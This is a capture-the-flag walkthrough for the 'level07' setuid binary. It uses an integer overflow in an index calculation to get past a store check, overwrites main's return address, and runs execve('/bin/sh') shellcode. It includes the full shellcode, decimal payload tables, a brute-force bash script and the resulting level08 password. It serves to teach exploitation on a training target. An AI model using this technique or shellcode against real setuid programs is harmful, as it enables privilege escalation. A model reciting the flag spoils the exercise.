# 07 - Int overflow
> README by [jchene](https://github.com/jchene)

We have a binary named level07 at /home/users/level07/

It is owned by `level08`, has a `setuid bit` and hax `NX` disabled

The program is made of 5 functions: `main`, `read_number`, `store_number`, `get_unum`, and `clear_stdin`

Just with those informations we can already sayt that this program is a little number storage program

Let's start with the `main` munction, the program first define some storage
for the number and for a command

```c
int main(int argc, const char **argv, const char **envp)
{
    int storage[100];
    char command[20];
    int number = 0;

    memset(storage, 0, sizeof(storage));
    memset(command, 0, sizeof(command));
```

Then the program takes the `argv` and `envp` and fills them with zeroes which means we can use any of these memory areas to store shellcode.

```c
    while (*argv)
    {
        memset((void *)*argv, 0, strlen(*argv));
        ++argv;
    }
    while (*envp)
    {
        memset((void *)*envp, 0, strlen(*envp));
        ++envp;
    }
```

Next a menu is displayed that warns us that `wil has reserved some storage`, we can see it prompts the user for a command which can be only `store` `read` and `quit`

```c
puts(
        "----------------------------------------------------\n"
        "  Welcome to wil's crappy number storage service!   \n"
        "----------------------------------------------------\n"
        " Commands:                                          \n"
        "    store - store a number into the data storage    \n"
        "    read  - read a number from the data storage     \n"
        "    quit  - exit the program                        \n"
        "----------------------------------------------------\n"
        "   wil has reserved some storage :>                 \n"
        "----------------------------------------------------\n");
```

We finally encounter an infinite loop that will get user inputs until the `quit` command is called

The program first gets the input, stores it inside the `command` buffer and replace the `\n` by a `\0` character

```c
while (1)
    {
        printf("Input command: ");
        fgets(command, 20, stdin);
        command[strlen(command) - 1] = 0;
```

Then it compares the input with the three available commands and executes the command if it is correct

```c
    number = 1;
    if (!memcmp(command, "store", 5))
        number = store_number((int)storage);
    else if (!memcmp(command, "read", 4))
        number = read_number((int)storage);
    else if (!memcmp(command, "quit", 4))
        return 0;
```

Lastly a print is made to inform the user about the exit status of the command and the command buffer is cleaned

```c
        if (number)
            printf(" Failed to do %s command\n", command);
        else
            printf(" Completed %s command successfully\n", command);
        memset(command, 0, sizeof(command));
    }
}
```

We have not detected any flaw in the `main` function, let's break down the `store_number` function

This function takes the `storage` buffer start address as `int`, as parameter

Then it prompts the user for a number and an index as `unsigned int` and gets them calling the `get_unum` function

```c
int store_number(int storageAddress)
{
    unsigned int number;
    unsigned int index;

    printf(" Number: ");
    number = get_unum();
    printf(" Index: ");
    index = get_unum();
```

The `index` and the `number` are being checked, if the check fails it prints an error message referring the the menu's warning

```c
    if (index % 3 == 0 || HIBYTE(number) == 183)
    {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
```

If the check is successfull, the programs proceed to store the `number` at the given `index`

```c
    else
    {
        *(int *)(storageAddress + 4 * index) = number;
        return 0;
    }
```

We can see that no other check is performed so maybe we can exploit this to store data anywhere we want in memory

Let's breakdown the `read_number` function before trying to exploit the `store_number` function

The program first prompts the user for an index then displays the content of the index as an `unsigned int` but no check is performed in the given `index` which means we could potentially use this function to read the memory of the porgram.

```c
int read_number(int storageAddress)
{
    int index;

    printf(" Index: ");
    index = get_unum();
    printf(" Number at data[%u] is %u\n", index, *(int *)(storageAddress + 4 * index));
    return 0;
}
```

First we will use `gdb` to try to find the return address of the `main` function, next we will try to find the location of address in memory using the `read_number` function, next we will try to overwrite this address by the address of a `shellcode` that we will craft and inject into the storage buffer

```
level07@OverRide:~$ gdb ./level07
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x8048729 in main; saved eip 0xf7e45513
```

The return address of the `main` function is `0xf7e45513`, now let's try to find it in the program's memory using the `read_number` function

First let's convert this address to an `unsigned int`

0xf7e45513 (hex) = 4158936339

Now we will write a small `shell` script that will automate the memory reading process

First we craft an input for the program which will consist in a series of read commands and an increasing index

```bash
#!/bin/bash
rm -f /tmp/input07
touch /tmp/input07
chmod 777 /tmp/input07
for i in $(seq 0 250)
do
        echo "read" >> /tmp/input07
        echo $i >> /tmp/input07
done
echo "quit" >> /tmp/input07
```

This will result in something like this

```
read
0
read
1
...
read
249
read
250
quit
```

We inject the input in the program and redirect all outputs to the `/tmp/output7` file

```bash
cat /tmp/input07 | /home/users/level07/level07 > /tmp/output07
```

This will result in this type of output

```
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Index:  Number at data[0] is 0
 Completed read command successfully
Input command:  Index:  Number at data[1] is 0
 Completed read command successfully
...
Input command:  Index:  Number at data[249] is 0
 Completed read command successfully
Input command:  Index:  Number at data[250] is 0
 Completed read command successfully
```

Let's try to grep the value we are looking for

```
level07@OverRide:~$ cat /tmp/output07 | grep "4158936339"
Input command:  Index:  Number at data[114] is 4158936339
```

Now we know the `main`'s return value is located at `index` 114, let's try to replace it with the `store_number` function to test the vulnerability

```
Input command: store
 Number: 42
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

We can't direclty write on the index 114 because 114 % 3 = 0

We will have to bypass this check, let's analyse the code to find a flaw

First we test the index and number values

```c
if (index % 3 == 0 || HIBYTE(number) == 183)
```

Then we store the number

The opertaion resides in a single line of code

```c
*(int *)(storageAddress + 4 * index) = number;
```

The index passed by the user is multiplied by 4 and added to the `storage` buffer address so we can try overflowing the result

If we give ( `UINT_MAX` + 1 ) / 4 as index, the number will be multiplied by 4 which will result in `UINT_MAX` + 1 which willl overflow to 0

Let's verify this on the index 1
```
UINT_MAX = 4 294 967 295
4 294 967 295 + 1 = 4 294 967 296 (UINT_MAX + 1)
4 294 967 296 / 4 = 1 073 741 824 ((UINT_MAX + 1) / 4 = index 0)
1 073 741 824 + 1 = 1 073 741 825 (index 1)
```

By giving 1 073 741 825 as index we should overflow and get index 1

1073741825

Let's try it

```
Input command: read
 Index: 1
 Number at data[1] is 0
 Completed read command successfully
Input command: store
 Number: 42
 Index: 1073741825
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 42
 Completed read command successfully
```

We have successfully exploited the overflow now we can overwrite the `main`'s return address, next we have to craft a `shellcode` and insert it in the program's memory

Because we can only insert `unsigned int` into the storage we will have insert the shellcode 4 bytes by 4 bytes so let's craft a shellcode that has 4*n bytes

Here is the same simple shellcode we used before which only performs `execve("/bin/sh")` and is 28 bytes long

```
\x90\x31\xc0\x31\xc9\x31\xd2\x31\xff\x31\xf6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

We have to divide it into 4 bytes parts convert them in little endian and convert it into a decimal number

```
\x90\x31\xc0\x31 -> 31c03190 -> 834679184
\xc9\x31\xd2\x31 -> 31d231c9 -> 835858889
\xff\x31\xf6\x52 -> 52f631ff -> 1391866367
\x68\x2f\x2f\x73 -> 732f2f68 -> 1932472168
\x68\x68\x2f\x62 -> 622f6868 -> 1647274088
\x69\x6e\x89\xe3 -> e3896e69 -> 3817434729
\xb0\x0b\xcd\x80 -> 80cd0bb0 -> 2160921520
```

Now we have to find the starting address of the buffer using `gdb`

```
    0x080488e7 <+452>:   mov    %eax,(%esp)
    0x080488ea <+455>:   call   0x8048630 <store_number>
```

We can see the buffer address is moved from eax to esp

Let's set a breakpoint and read the registers

```
(gdb) b*0x080488ea
Breakpoint 1 at 0x80488ea
(gdb) r
Input command: store

Breakpoint 1, 0x080488ea in main ()
(gdb) info reg
eax     0xffffd554      -10924
```

The buffer address seems to be `0xffffd554` let's insert our shellcode and inspect the address to confim that the insertion was successfull

We have to use the overflow trick to insert a value every 3 index:

```
Number: 834679184
Index: 1073741824 (1073741824 + 0 = index 0)

Number: 835858889
Index: 1

Number: 1391866367
Index: 2

Number: 1932472168
Index: 1073741827 (1073741824 + 3 = index 3)

Number: 1647274088
Index: 4

Number: 3817434729
Index: 5

Number: 2160921520
Index: 1073741830 (1073741824 + 6 = index 6)
```

Let's verify the shellcode

```
(gdb) x/12i 0xffffd554
   0xffffd554:  nop
   0xffffd555:  xor    %eax,%eax
   0xffffd557:  xor    %ecx,%ecx
   0xffffd559:  xor    %edx,%edx
   0xffffd55b:  xor    %edi,%edi
   0xffffd55d:  xor    %esi,%esi
   0xffffd55f:  push   %edx
   0xffffd560:  push   $0x68732f2f
   0xffffd565:  push   $0x6e69622f
   0xffffd56a:  mov    %esp,%ebx
   0xffffd56c:  mov    $0xb,%al
   0xffffd56e:  int    $0x80
```

The shellcode was successfully inserted now we have to convert the return address into a decimal number and store it at index 114

ffffd554 = 4294956372

```
Number: 4294956372
Index: 1073741938 (1073741824 + 114 = index 114)
 Completed store command successfully
Input command: quit
process 1771 is executing new program: /bin/dash
```

The shellcode was successfully executed, now we have to do the same without `gdb` but because of an offset caused by `gdb` we have to find the new buffer address, in general it's located 8, 16 or 32 bytes after the original one

Let's automate this using bash, we will try every address in a range of 256 starting at `gdb`'s
```bash
#!/bin/bash
for i in $(seq 0 256)
do
    rm -f /tmp/pwn07
    touch /tmp/pwn07
    chmod 777 /tmp/pwn07

    echo "store" >> /tmp/pwn07
    echo "834679184" >> /tmp/pwn07
    echo "1073741824" >> /tmp/pwn07

    ...

    echo "store" >> /tmp/pwn07
    echo "$((4294956372 + $i))" >> /tmp/pwn07
    echo "1073741938" >> /tmp/pwn07

    echo "quit" >> /tmp/pwn07

    (cat /tmp/pwn07; cat) | /home/users/level07/level07

done
```

Now we press enter until the right address is found, you can detect it because every iteration prints the program's menu, we found it when we click enter and the menu does not appears

```
...
Input command:  Number:  Index:  Completed store command successfully


whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

The flag is
```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
